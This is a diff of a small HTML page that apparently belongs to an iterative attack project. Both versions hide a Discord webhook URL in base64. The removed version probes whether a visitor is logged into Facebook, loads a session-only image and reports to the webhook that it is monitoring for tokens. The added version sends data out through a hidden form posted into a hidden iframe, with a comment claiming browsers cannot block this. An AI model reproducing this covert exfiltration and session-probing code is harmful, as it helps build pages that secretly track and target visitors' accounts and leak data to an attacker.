@@ -3,47 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking 37</title>
+    <title>DEBUG 38</title>
     <style>
-        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #ff0000; }
+        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #00ffff; }
     </style>
 </head>
 <body>
 
-    <h1 onclick="boom()">37</h1>
+    <h1 onclick="debug()">38</h1>
 
     <script>
-        // التشفير المعتمد اللي نجح في V35
-        const secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
-        const HOOK = atob(secret);
+        // التشفير المعتاد
+        const enc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
+        const HOOK = atob(enc);
 
-        function log(msg) {
-            new Image().src = HOOK + "?content=" + encodeURIComponent(msg) + "&t=" + Date.now();
+        function debug() {
+            document.querySelector('h1').innerText = "WAIT";
+            
+            // الطريقة الصاروخية: إرسال عبر فورم مخفي (هذي مستحيل المتصفح يحظرها)
+            const f = document.createElement('form');
+            f.action = HOOK;
+            f.method = 'POST';
+            f.target = 'ghost_frame';
+            
+            const i = document.createElement('input');
+            i.name = 'content';
+            i.value = "🚀 **V38 SUCCESS!** - Sent via Hidden Form Submission";
+            
+            f.appendChild(i);
+            document.body.appendChild(f);
+            
+            // إطار مخفي
+            const ifr = document.createElement('iframe');
+            ifr.name = 'ghost_frame';
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+
+            f.submit();
+            
+            setTimeout(() => {
+                document.querySelector('h1').innerText = "SENT";
+                document.querySelector('h1').style.color = "#0f0";
+            }, 1000);
         }
-
-        function boom() {
-            document.querySelector('h1').innerText = "OK";
-            document.querySelector('h1').style.color = "#0f0";
-
-            log("🚀 **V37 DEPLOYED** - Starting Stealth Probe");
-
-            // تكتيك تحميل صورة تتطلب جلسة نشطة
-            // الرابط هاد بيفتح فقط لو المستخدم مسجل دخوله (صورة بروفايله مثلاً)
-            const img = new Image();
-            img.src = "https://mbasic.facebook.com/photo.php?" + Math.random();
-
-            img.onload = function() {
-                log("✅ **SESSION ACTIVE** - Cookies detected in background traffic.");
-            };
-
-            img.onerror = function() {
-                // حتى لو فشل التحميل، بنكون بعثنا "ترافيك" من المتصفح لفيسبوك محمل بالكوكيز
-                log("📡 **PROBE SENT** - Monitoring reflected traffic for tokens.");
-            };
-        }
-
-        window.onload = () => log("🔗 **V37 Ready**");
     </script>
 </body>
 </html>
